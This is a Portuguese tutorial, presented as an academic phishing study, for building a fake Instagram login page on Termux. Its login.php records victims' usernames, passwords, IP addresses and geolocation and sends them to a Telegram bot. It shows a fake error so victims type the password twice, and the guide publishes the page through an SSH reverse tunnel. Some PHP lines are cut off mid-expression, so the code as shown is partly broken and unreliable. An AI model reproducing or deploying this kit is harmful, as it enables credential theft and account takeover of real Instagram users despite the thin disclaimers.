Instagram Phishing Study — Segurança Cibernética
⚠️ Projeto acadêmico: desenvolvido para estudo de phishing, engenharia social e conscientização em segurança. Utilize somente em ambientes controlados e com autorização.
Tecnologias utilizadas
Termux
HTML/CSS
PHP
SSH
localhost.run
1. Preparação do Termux
pkg update
pkg upgrade
Instalação das ferramentas:
pkg install php
pkg install openssh
pkg install nano
2. Estrutura do projeto
cd ~
mkdir instagram-phishing-study
cd instagram-phishing-study
Criação dos arquivos:
touch index.html
touch login.php
touch README.md
Estrutura:
instagram-phishing-study/
├── index.html
├── login.php
└── README.md
3. Edição dos arquivos
Para editar o HTML:
nano index.html
index.html
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>

  <link
    rel="stylesheet"
    href="https://fonts.googleapis.com/css?family=Roboto:400,500"
  >

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
      text-align: center;
    }

    .logo {
      width: 200px;
      margin: 40px auto 20px;
    }

    .facebook-btn {
      background-color: #1877f2;
      color: white;
      font-weight: bold;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 15px;
      gap: 8px;
    }

    .facebook-btn svg {
      width: 16px;
      height: 16px;
    }
  </style>
</head>
No Nano:
Ctrl + O — salvar
Enter — confirmar
Ctrl + X — sair
Depois edite o PHP:
nano login.php
login.php
<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'];

    // Coletar localização do IP
    $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $local = "";
    if ($geo && $geo->status == "success") {
        $local = "\\n🌍 Localização: {$geo->country}, {$geo->regionName}, {$geo->city} ({$geo->lat>
    }

    // Montar mensagem
    $mensagem = "📥 NOVO LOGIN FAKE INSTAGRAM\n👤 Usuário: $user\n🔑 Senha: $pass\n🕵️ IP: $ip\n🖥️ Na>

    // Enviar pro Telegram
    $token = "SEU_TOKEN_REAL"; // Seu token do bot
    $chat_id = "SEU_CHAT_ID_REAL"; // Seu chat ID
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($me>
    file_get_contents($url);

    // Simular erro na primeira tentativa
    if (!isset($_SESSION['tried_once'])) {
        $_SESSION['tried_once'] = true;
        header("Location: index.html?error=1");
        exit();
    } else {
        session_destroy();
        // Redirecionar para o Reels real após a segunda tentativa
        header("Location: https://www.instagram.com/reel/DHlbNfNuGms/?igsh=ODhzMzNoa2F4d2Fx");
        exit();
    }
}
?>

No Nano:
Ctrl + O — salvar
Enter — confirmar
Ctrl + X — sair
4. Servidor PHP local
Execute:
php -S 127.0.0.1:8080
A aplicação estará disponível localmente em:
http://127.0.0.1:8080
5. Tunelamento utilizado no laboratório
A atividade também estudou o conceito de SSH Reverse Port Forwarding.
Fluxo:
Internet
   ↓
Serviço de tunelamento
   ↓
SSH Reverse Tunnel
   ↓
localhost:8080
   ↓
Servidor PHP
Comando registrado durante a atividade:
ssh -R 80:localhost:8080 nokey@localhost.run
Funcionamento
ssh inicia uma conexão SSH.
-R solicita encaminhamento remoto de porta.
80 representa a porta no lado remoto.
localhost:8080 representa o servidor executado localmente.
localhost.run foi o serviço utilizado para estudar o funcionamento do túnel.
O tunelamento deve ser utilizado somente para aplicações e ambientes em que exista autorização para exposição externa.
6. Execução local
Entre na pasta:
cd ~/instagram-phishing-study
Inicie o servidor:
php -S 127.0.0.1:8080
Para testes locais:
http://127.0.0.1:8080
Aviso
Este projeto documenta conceitos estudados em ambiente acadêmico.
As técnicas apresentadas devem ser utilizadas somente em ambientes controlados, com autorização e para fins legítimos de ensino ou pesquisa em segurança.
Antes de publicar qualquer código, devem ser removidos:
tokens;
senhas;
chaves de API;
chat IDs;
credenciais;
dados pessoais;
endereços IP coletados;
informações de geolocalização.
No GitHub, cole isso no editor do README.md e use a aba Preview antes de salvar. Os blocos bash, html, php e text vão aparecer formatados e com opção de copiar.

